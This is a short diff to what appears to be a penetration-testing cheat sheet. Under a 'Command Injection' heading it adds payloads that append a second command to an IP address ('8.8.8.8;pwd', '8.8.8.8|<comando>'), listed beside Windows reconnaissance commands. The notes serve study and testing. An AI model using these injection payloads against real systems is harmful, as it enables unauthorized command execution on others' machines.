@@ -14,6 +14,8 @@
 
 ### Command Injection
 
+```8.8.8.8;pwd``` o ```8.8.8.8|<comando>```
+
 ``net user``  (Find users)
  		       
 ``dir C:\`` (directory listing)
